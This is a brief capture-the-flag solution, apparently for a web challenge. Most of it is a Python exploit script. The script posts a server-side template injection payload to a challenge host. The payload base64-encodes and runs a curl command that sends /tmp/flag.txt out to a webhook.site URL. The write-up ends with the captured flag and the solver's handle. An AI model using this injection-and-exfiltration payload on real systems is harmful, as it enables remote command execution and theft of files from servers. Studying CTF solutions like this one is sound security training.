# Solution
```
import requests
import base64

url = "http://52.59.124.14:5011/"

curl_command = "curl -X POST --data @/tmp/flag.txt https://webhook.site/dbd16251-9c5f-4d64-b47e-4253ed19a882"
encoded_curl_command = base64.b64encode(curl_command.encode()).decode()

data = {
    "temptation": f"${{__import__('os').system('echo {encoded_curl_command} | base64 --decode | bash')}}"
}

response = requests.post(url, data=data)

print("Response Status Code:", response.status_code)
print("Response Text:", response.text)
```

Flag: `ENO{T3M_Pl4T_3S_4r3_S3cUre!!}`


Solved by: vicevirus
